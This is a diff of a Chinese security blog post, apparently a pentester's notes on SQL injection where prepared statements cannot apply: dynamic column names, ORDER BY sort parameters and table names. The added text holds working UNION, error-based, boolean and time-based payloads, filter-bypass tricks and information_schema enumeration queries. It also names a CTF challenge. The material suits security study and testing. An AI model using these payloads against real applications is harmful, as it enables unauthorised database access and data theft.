@@ -19,12 +19,12 @@ if (!doNotTrack) {
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>
       
-  预编译的漏网之鱼捕捞 &ndash; 春田花花幼稚园
+  捕捞预编译漏网小鱼 &ndash; 春田花花幼稚园
 
     </title>
     
     
-    <meta name="description" property="og:description" content="在Java持久化层或Web框架化的情况下，要么很难有SQL注入，要么全是SQL注入（没用防注入框架的网站，xray狂喜）。这里列出特例或者开发常犯错的例子，让我们钻空子，找找漏洞。
+    <meta name="description" property="og:description" content="在Java持久化层或Web框架化的情况下，要么很难有SQL注入，要么全是SQL注入（没用防注入框架的网站，xray狂喜）。这里列出特例或者开发常犯错的例子。
 |blog under go1f.github.io">
     
 
@@ -93,7 +93,7 @@ if (!doNotTrack) {
 
 <div class="Subhead">
   <div class="Subhead-heading">
-    <div class="h1 mt-3 mb-1">预编译的漏网之鱼捕捞</div>
+    <div class="h1 mt-3 mb-1">捕捞预编译漏网小鱼</div>
   </div>
   <div class="Subhead-description">
     
@@ -105,7 +105,7 @@ if (!doNotTrack) {
 
     
     <div class="float-md-right">
-      <span title="Lastmod: 2023-06-17. Published at: 2022-10-30.">
+      <span title="Lastmod: 2023-06-17. Published at: 2023-06-17.">
         
           Lastmod: 2023-06-17
         
@@ -117,30 +117,118 @@ if (!doNotTrack) {
 <article>
   
   <section class="pb-6 mb-3 border-bottom">
-    <p>在Java持久化层或Web框架化的情况下，要么很难有SQL注入，要么全是SQL注入（没用防注入框架的网站，xray狂喜）。这里列出特例或者开发常犯错的例子，让我们钻空子，找找漏洞。</p>
-<p>框架化或者预编译</p>
+    <p>在Java持久化层或Web框架化的情况下，要么很难有SQL注入，要么全是SQL注入（没用防注入框架的网站，xray狂喜）。这里列出特例或者开发常犯错的例子。</p>
+<h2 id="sql语句有哪些参数无法动态编译">SQL语句有哪些参数无法动态编译？</h2>
+<p>即，无法参数化与预编译的情况有哪些？</p>
 <ol>
-<li>表名和列名：在大多数情况下，表名和列名是固定的，无法使用参数来动态设置。这是因为SQL查询优化器需要在编译阶段确定表的结构和可用索引等信息。如果使用动态输入的表名或列名，查询优化器无法在编译阶段进行优化和验证，这可能导致性能下降或安全问题。在需要动态表名或列名的情况下，应该谨慎使用，确保输入的值经过充分的验证和过滤。</li>
-<li>SQL关键字和语法结构：SQL关键字（如SELECT、INSERT、UPDATE等）和语法结构（如FROM、WHERE、GROUP BY等）也是固定的，不能使用参数来动态设置。这些关键字和语法结构是SQL语句的组成部分，必须在编译阶段确定。如果需要根据动态条件构建不同的SQL查询，可以使用条件语句（如IF、CASE WHEN）来控制SQL语句的结构。</li>
-<li>表达式和函数：SQL语句中的表达式和函数通常是根据列和常量进行计算和操作的，无法通过参数来动态设置。例如，日期函数、数学函数、字符串函数等是在SQL解析和执行阶段计算的，无法动态替换参数。</li>
+<li>
+<p>表名和列名</p>
+</li>
+<li>
+<p>SQL关键字和语法结构</p>
+<blockquote>
+<p>SQL关键字（如SELECT、INSERT、UPDATE等）和语法结构（如FROM、WHERE、GROUP BY等）如果需要根据动态条件构建不同的SQL查询，可以使用条件语句（如IF、CASE WHEN）来控制SQL语句的结构。</p>
+</blockquote>
+</li>
+<li>
+<p>表达式和函数</p>
+<blockquote>
+<p>日期函数、数学函数、字符串函数等。</p>
+</blockquote>
+</li>
 </ol>
-<p>order by 注入</p>
-<p>asc</p>
-<p>desc</p>
+<h2 id="列名">列名</h2>
+<p>列名常见以下位置。</p>
+<h3 id="select子句">SELECT子句</h3>
+<p>列名通常用于指定要检索的列。例如：</p>
+<pre tabindex="0"><code>SELECT username, age FROM users;
+</code></pre><p>检索列如果可控。可以想像一下，API接口的参数长什么样子。我最喜欢看见POST里混杂JSON格式的参数了。</p>
+<pre tabindex="0"><code>#列括号表示
+select=[&#34;username&#34;,&#34;age&#34;]&amp;username=kokoisko&amp;age=25
+#JSON格式，动态参数
+{&#34;username&#34;=&#34;test&#34;,&#34;age&#34;=25}
+#参数接JSON
+query={&#34;username&#34;=&#34;test&#34;,&#34;age&#34;=25}
+</code></pre><p>构造利用，推荐UNION。因为后端的SQL拼接语句有可能包含换行符，注释符号注释不了多行，导致报错。</p>
+<pre tabindex="0"><code>#UNION payload:
+#SELECT 1,2 union select username, age FROM users;
+
+1,2 union select username
+
+
+#注释截断的payload：
+#SELECT 1,2 from information_schema.schemata --, age FROM users;
+
+1,2 from information_schema.schemata --
+</code></pre><h3 id="where子句">WHERE子句</h3>
+<p>列名用于指定用于筛选数据的条件。例如：</p>
+<pre tabindex="0"><code>SELECT username, age FROM users where username=?
+</code></pre><p>筛选条件列如果可控。可以想像一下，API接口的参数长什么样子。</p>
+<p>没错，和上面SELECT字句差不多。</p>
+<pre tabindex="0"><code>#Error based
+#SELECT username, age FROM users where `username`=(SELECT extractvalue(1,CONCAT(0x7e,(SELECT user()),&#39;~&#39;))) and username = ?
+#Error based payload:
+username=`username`%2D(SELECT extractvalue(1,CONCAT(0x7e,(SELECT+user()),&#39;~&#39;)))+and+username
+</code></pre><h3 id="order-by子句">ORDER BY子句</h3>
+<p>列名用于指定排序的列。例如：</p>
+<pre tabindex="0"><code>SELECT username, id FROM grace_db ORDER BY username ASC;
+</code></pre><p>可以想像一下，接口的参数长什么样子。关键字有sort、order、ord、sortOrder、sidx、sord。</p>
+<pre tabindex="0"><code>sort=username&amp;ord=ASC
+</code></pre><p>sort参数：</p>
+<pre tabindex="0"><code>#报错
+sort=updatexml(1,concat(0x7e,(select @@user)),1)
+#真假
+sort=if(1%3D1,id,username)
+#时间
+sort=if(1%3D1,1,sleep(1))
+</code></pre><p>注意order by后可以逗号分隔多个列名排序，那么就可以转换为sort参数的情况。</p>
+<p>ord参数：</p>
+<pre tabindex="0"><code>ord=,updatexml(1,concat(0x7e,(select @@user)),1),1)+ASC
+ord=,if(1%3D1,id,username)+ASC
+</code></pre><h2 id="表名">表名</h2>
+<h3 id="from子句">FROM子句</h3>
+<p>建议UNION续写</p>
+<pre tabindex="0"><code>SELECT username, age FROM `users` where username=&#34;abc&#34;;
+SELECT username, age FROM users union select 1,2 union select username, age from users where username=&#34;abc&#34;;
+#payload:
+table=users+union+select+1,2+union+select+username,age+from+users
+</code></pre><h2 id="其它">其它</h2>
+<p>写着写着，觉得其它情况里，SQL关键字与函数的注入，确实少见，就不展开废话了。</p>
+<p>因为关键还是闭合，在列名表名导致注入的情况其实已经覆盖得差不多了。</p>
+<p>后记：</p>
+<p>翻了一下挖过的注入，还真的有条件符号可定义的情况。</p>
+<p>感叹，开发，无奇不有。</p>
+<pre tabindex="0"><code>http://test.com/findprofilelist?sorts=%255B%255D&amp;conditions=[{&#34;Field&#34;:&#34;@@version&#34;,&#34;DataType&#34;:1,&#34;Option&#34;:1,&#34;Value&#34;:&#34;1&#34;}]&amp;userId=1
+
+DataType=1时，后端代码会自动转换类型为int
+DataType=2时，估计数据类型为char
+Field使用单引号测试，可观察语句结构，获知`Field` = `Value`的结构。即可操纵列名，及对应的值。
+Option=1，为不等于，2为等于之类的操作符号。
+</code></pre><p>换位思考，换我，我也这样写，完成功能要紧。安全？你们测出来再改。</p>
+<h2 id="参考阅读">参考阅读</h2>
+<p><a href="https://yang1k.github.io/post/sql%E6%B3%A8%E5%85%A5%E4%B9%8Border-by%E6%B3%A8%E5%85%A5">sql注入之order-by注入</a></p>
+<p><a href="https://paper.seebug.org/1688/#0x04-sql">从一个 Laravel SQL 注入漏洞开始的 Bug Bounty 之旅</a></p>
 <p>ThinkPHP Laravel SQL 注入</p>
 <p>使用数组进行框架ORM注入</p>
-<p><a href="https://paper.seebug.org/1688/#0x04-sql">从一个 Laravel SQL 注入漏洞开始的 Bug Bounty 之旅</a></p>
+<h3 id="备忘">备忘</h3>
 <p>报错函数</p>
 <pre tabindex="0"><code>updatexml(1,concat(&#39;~&#39;,(select(database()))),1)
+#mssql error payload
+convert(int,sys.fn_sqlvarbasetostr(HashBytes(&#39;MD5&#39;,&#39;1470094982&#39;)))
 </code></pre><p>字符函数</p>
 <pre tabindex="0"><code>substring(&#39;123&#39;,32,64)
+substr(&#39;123&#39;,32,64)
 left(&#39;123&#39;,3)
 right(&#39;123&#39;,3)
+hex
+ascii
 </code></pre><p>空格/分割符号</p>
 <pre tabindex="0"><code>%0c %0a () /**/
+1.1 1e9 
 </code></pre><p>符号替换</p>
 <pre tabindex="0"><code>or and =&gt; &amp;&amp; ||
 xor
+= like in
 </code></pre><p>查看数据库</p>
 <pre tabindex="0"><code>select(group_concat(schema_name))from(information_schema.schemata)
 </code></pre><p>查看表名</p>
@@ -182,10 +270,25 @@ flag{85a4c8ec-31b2-4296-8273-4e80fddfc48e}
           
   
     <div id="toc" class="Box Box--blue mb-3">
-      <b>预编译的漏网之鱼捕捞</b><nav id="TableOfContents">
+      <b>捕捞预编译漏网小鱼</b><nav id="TableOfContents">
   <ul>
-    <li>
+    <li><a href="#sql语句有哪些参数无法动态编译">SQL语句有哪些参数无法动态编译？</a></li>
+    <li><a href="#列名">列名</a>
       <ul>
+        <li><a href="#select子句">SELECT子句</a></li>
+        <li><a href="#where子句">WHERE子句</a></li>
+        <li><a href="#order-by子句">ORDER BY子句</a></li>
+      </ul>
+    </li>
+    <li><a href="#表名">表名</a>
+      <ul>
+        <li><a href="#from子句">FROM子句</a></li>
+      </ul>
+    </li>
+    <li><a href="#其它">其它</a></li>
+    <li><a href="#参考阅读">参考阅读</a>
+      <ul>
+        <li><a href="#备忘">备忘</a></li>
         <li><a href="#极客大挑战-2019hardsql1">[极客大挑战 2019]HardSQL1</a></li>
       </ul>
     </li>
